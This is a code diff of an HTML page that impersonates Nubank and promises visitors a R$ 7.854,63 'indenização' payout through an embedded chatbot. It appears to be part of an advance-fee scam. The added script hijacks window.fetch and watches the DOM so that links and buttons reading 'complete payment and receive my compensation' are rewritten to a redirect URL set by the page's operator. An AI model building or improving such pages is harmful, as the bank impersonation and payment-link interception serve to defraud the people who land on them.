@@ -5,87 +5,184 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Saque da Indenização</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Substitua o CDN por um arquivo local em produção -->
+  <link href="css/tailwind.css" rel="stylesheet">
 </head>
 
 <body class="bg-[#831BD1] min-h-screen flex flex-col">
-  <!-- Cabeçalho e conteúdo principal permanecem iguais -->
+  <header class="bg-white px-4 shadow-md">
+    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
+      <img src="images/logo.svg" alt="Nubank" class="h-16 w-auto">
+    </div>
+  </header>
 
-  <script type="module">
-    import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';
+  <main class="flex-1 px-4 py-2">
+    <div class="flex flex-col">
+      <main>
+        <div class="max-h-min">
+          <div class="px-0.5 pb-[0.6rem]">
+            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
+              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
+                <p class="text-base">
+                  <span>Olá, </span>
+                  <span class="text-black font-bold">USUáRIO!</span>
+                </p>
+                <p class="mt-1 text-sm">
+                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
+                </p>
+              </div>
 
-    // Nova abordagem segura para inicialização
-    async function initializeTypebot() {
-      try {
-        // Verifica se Typebot e initStandard existem
-        if (Typebot && typeof Typebot.initStandard === 'function') {
-          const typebotInit = Typebot.initStandard({
-            typebot: "nub-1-mcrdbzs",
-            apiHost: "https://chat.typezap.site",
-          });
-          
-          // Se retornar uma Promise, usa then/catch
-          if (typebotInit && typeof typebotInit.then === 'function') {
-            await typebotInit;
-          }
-          
-          console.log('Typebot carregado - Iniciando interceptação');
-          initRedirectionSystem();
-        } else {
-          console.error('Typebot.initStandard não disponível');
-          // Tenta novamente após 1 segundo
-          setTimeout(initializeTypebot, 1000);
-        }
-      } catch (error) {
-        console.error('Erro ao carregar Typebot:', error);
-        setTimeout(initializeTypebot, 1000);
-      }
-    }
+              <!-- Typebot - Coloque o elemento ANTES do script -->
+              <typebot-standard></typebot-standard>
 
-    // Inicia o processo
-    initializeTypebot();
-  </script>
+              <script type="module">
+                import { initStandard } from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';
 
-  <script>
-  // Sistema de Redirecionamento (mesmo código anterior)
-  function initRedirectionSystem() {
-    // 1. Interceptação de API
-    const originalFetch = window.fetch;
-    window.fetch = async function(url, options) {
-      if (url.includes('/continueChat')) {
-        try {
-          const response = await originalFetch.apply(this, arguments);
-          const clonedResponse = response.clone();
-          const data = await clonedResponse.json();
-          
-          if (JSON.stringify(data).includes('Concluir pagamento e receber minha indenização')) {
-            data.messages = data.messages.map(msg => {
-              if (msg.content?.richText) {
-                msg.content.richText = msg.content.richText.map(rich => ({
-                  ...rich,
-                  children: rich.children.map(child => ({
-                    ...child,
-                    text: child.text?.replace(/https?:\/\/[^\s]+/g, 'https://google.com')
-                  }))
-                }));
+                // Função para garantir que o elemento existe
+                function ensureTypebotElement() {
+                  if (!document.querySelector('typebot-standard')) {
+                    const typebotEl = document.createElement('typebot-standard');
+                    document.querySelector('.overflow-hidden').appendChild(typebotEl);
+                  }
+                }
+
+                async function initializeTypebot() {
+                  try {
+                    ensureTypebotElement();
+                    
+                    await initStandard({
+                      typebot: "nub-1-mcrdbzs",
+                      apiHost: "https://chat.typezap.site",
+                    });
+                    
+                    console.log('Typebot inicializado com sucesso');
+                    initRedirectionSystem();
+                  } catch (error) {
+                    console.error('Erro ao inicializar Typebot:', error);
+                    // Tenta novamente após 2 segundos
+                    setTimeout(initializeTypebot, 2000);
+                  }
+                }
+
+                // Inicia após o DOM estar completamente carregado
+                if (document.readyState === 'complete') {
+                  initializeTypebot();
+                } else {
+                  window.addEventListener('load', initializeTypebot);
+                }
+              </script>
+
+              <script>
+              // Sistema de Redirecionamento
+              function initRedirectionSystem() {
+                const TARGET_TEXT = "Concluir pagamento e receber minha indenização";
+                const REDIRECT_URL = "https://google.com";
+                
+                // 1. Interceptação de API
+                const originalFetch = window.fetch;
+                window.fetch = async function(input, init) {
+                  const url = typeof input === 'string' ? input : input.url;
+                  if (url && url.includes('/continueChat')) {
+                    try {
+                      const response = await originalFetch.apply(this, arguments);
+                      const clonedResponse = response.clone();
+                      const data = await clonedResponse.json();
+                      
+                      if (JSON.stringify(data).includes(TARGET_TEXT)) {
+                        data.messages = data.messages.map(msg => {
+                          if (msg.content?.richText) {
+                            msg.content.richText = msg.content.richText.map(rich => ({
+                              ...rich,
+                              children: rich.children.map(child => ({
+                                ...child,
+                                text: child.text?.replace(/https?:\/\/[^\s]+/g, REDIRECT_URL)
+                              }))
+                            }));
+                          }
+                          return msg;
+                        });
+                        console.log('✅ Resposta da API modificada');
+                        return new Response(JSON.stringify(data), response);
+                      }
+                      return response;
+                    } catch (e) {
+                      console.error('Erro ao interceptar API:', e);
+                      return originalFetch.apply(this, arguments);
+                    }
+                  }
+                  return originalFetch.apply(this, arguments);
+                };
+
+                // 2. Monitoramento do DOM
+                const observer = new MutationObserver(mutations => {
+                  mutations.forEach(mutation => {
+                    mutation.addedNodes.forEach(node => {
+                      if (node.nodeType === 1) {
+                        scanAndReplaceInNode(node);
+                      }
+                    });
+                  });
+                });
+
+                observer.observe(document.body, {
+                  childList: true,
+                  subtree: true,
+                  attributes: true
+                });
+
+                // 3. Verificação inicial
+                scanAndReplaceInDocument();
+                
+                console.log('🛡 Sistema de redirecionamento ativado');
               }
-              return msg;
-            });
-            console.log('✅ Resposta da API modificada');
-            return new Response(JSON.stringify(data), response);
-          }
-          return response;
-        } catch (e) {
-          console.error('Erro ao interceptar API:', e);
-          return originalFetch.apply(this, arguments);
-        }
-      }
-      return originalFetch.apply(this, arguments);
-    };
 
-    // Restante do código de interceptação permanece igual...
-    // ... (código completo de initRedirectionSystem)
-  }
-  </script>
+              function scanAndReplaceInDocument() {
+                scanAndReplaceInNode(document);
+                
+                // Verifica no Shadow DOM
+                const typebot = document.querySelector('typebot-standard');
+                if (typebot?.shadowRoot) {
+                  scanAndReplaceInNode(typebot.shadowRoot);
+                }
+              }
+
+              function scanAndReplaceInNode(node) {
+                const TARGET_TEXT = "Concluir pagamento e receber minha indenização";
+                const REDIRECT_URL = "https://google.com";
+                
+                try {
+                  const elements = node.querySelectorAll 
+                    ? node.querySelectorAll('a, button, [onclick]') 
+                    : [];
+                  
+                  elements.forEach(el => {
+                    if (el.textContent?.includes(TARGET_TEXT) && !el.dataset.intercepted) {
+                      el.dataset.intercepted = 'true';
+                      
+                      if (el.tagName === 'A') {
+                        el.href = REDIRECT_URL;
+                        el.target = '_blank';
+                      }
+                      
+                      el.onclick = function(e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        window.open(REDIRECT_URL, '_blank');
+                      };
+                      
+                      console.log('🔗 Elemento interceptado:', el);
+                    }
+                  });
+                } catch (e) {
+                  console.error('Erro ao verificar nó:', e);
+                }
+              }
+              </script>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+  </main>
 </body>
 </html>
